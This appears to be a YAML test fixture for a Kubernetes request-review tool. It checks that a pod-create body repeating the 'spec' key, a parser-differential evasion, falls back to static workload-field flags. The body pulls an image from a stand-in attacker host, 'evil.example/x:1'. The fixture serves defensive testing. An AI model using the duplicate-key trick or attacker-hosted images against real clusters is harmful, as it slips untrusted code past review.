# Create admission changes are kept only at the body's own field paths, so a body the engine reads differently from the server hides them. The dry run is what a 1.28 server returns for a body that repeats "spec": the first spec's container, merged with the second's restartPolicy. A body that repeats a key can't be compared with it, so the request's static changes, the root, stand in.
- name: 'T37 exact: a create whose body repeats a key falls back on the static changes'
  tests: [T37]
  proposal:
    spec:
      type: Api
      api:
        requests:
          - {verb: create, apiVersion: v1, resource: pods, namespace: payments, body: '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"p","namespace":"payments"},"spec":{"containers":[{"name":"a","image":"evil.example/x:1"}]},"spec":{"restartPolicy":"Always"}}'}
      justification: A test proposal.
  observed:
    - request: 0
      dryRun:
        apiVersion: v1
        kind: Pod
        metadata: {name: p, namespace: payments, uid: 6e3c8b0e-3f3e-4a9c-8d0e-1c7d6b5a4f21}
        spec:
          containers:
            - {name: a, image: "evil.example/x:1", imagePullPolicy: IfNotPresent}
          restartPolicy: Always
          serviceAccountName: default
  static:
    - {reason: InvalidJSON, request: 0}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].image'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].image'}
    - {reason: WorkloadField, request: 0, field: '**.ephemeralContainers[*]'}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].command'}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].args'}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].env'}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].envFrom'}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].volumeMounts'}
    - {reason: WorkloadField, request: 0, field: '**.containers[*].securityContext'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].command'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].args'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].env'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].envFrom'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].volumeMounts'}
    - {reason: WorkloadField, request: 0, field: '**.initContainers[*].securityContext'}
    - {reason: WorkloadField, request: 0, field: '**.volumes'}
    - {reason: WorkloadField, request: 0, field: '**.serviceAccountName'}
